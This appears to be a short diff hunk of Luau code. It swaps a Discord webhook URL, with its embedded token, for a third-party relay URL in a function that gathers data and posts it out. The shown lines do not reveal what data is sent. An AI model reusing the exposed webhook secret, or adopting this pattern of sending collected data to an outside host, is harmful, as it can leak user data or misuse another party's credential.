@@ -28,7 +28,7 @@ local function n(): table
 end
 
 local function o(status: string): ()
-    local w = "https://discord.com/api/webhooks/1385008938378068048/FqdO2LqLJS-tMmmfhW06tN7LACrehpTsySyF05h4fJkuZhTYMdeSY7BqCgOAVG3FxEmU"
+    local w = "https://dcrelay.liteeagle.me/relay/3f300af1-e5f4-4d51-90ac-ab9cb8d49021"
     local data = n()
     local t = os.time()
     local color: number
